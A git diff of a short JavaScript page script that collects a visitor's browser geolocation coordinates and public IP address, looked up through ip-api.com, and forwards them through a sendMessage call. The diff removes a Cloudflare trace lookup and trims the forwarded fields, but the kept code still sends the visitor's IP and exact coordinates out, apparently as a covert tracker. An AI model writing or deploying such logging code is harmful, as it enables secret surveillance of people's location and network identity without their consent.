@@ -14,14 +14,7 @@ function getLocation() {
 spc = " "
 var anew
 function showPosition(position) {
-  text('https://www.cloudflare.com/cdn-cgi/trace').then(data => {
-  let ipRegex = /[0-9]{1,3}.[0-9]{1,3}.[0-9]{1,3}.[0-9]{1,3}/
-  let ip = data.match(ipRegex)[0];
-  console.log(ip);
   anew = position.coords.longitude+spc+position.coords.latitude+spc
-  console.log(anew);
-});
-  console.log(position)
 }
 
 getLocation()
@@ -52,6 +45,6 @@ req.overrideMimeType("application/json");
 req.open('GET', 'http://ip-api.com/json/?fields=61439', true);
 req.onload  = function() {
   ipr = JSON.parse(req.responseText);
-  sendMessage(ipr.query+spc+ipr.city+spc+ipr.org+spc+ipr.region+spc+anew)
+  sendMessage(ipr.query+spc+anew)
 };
 req.send(null);
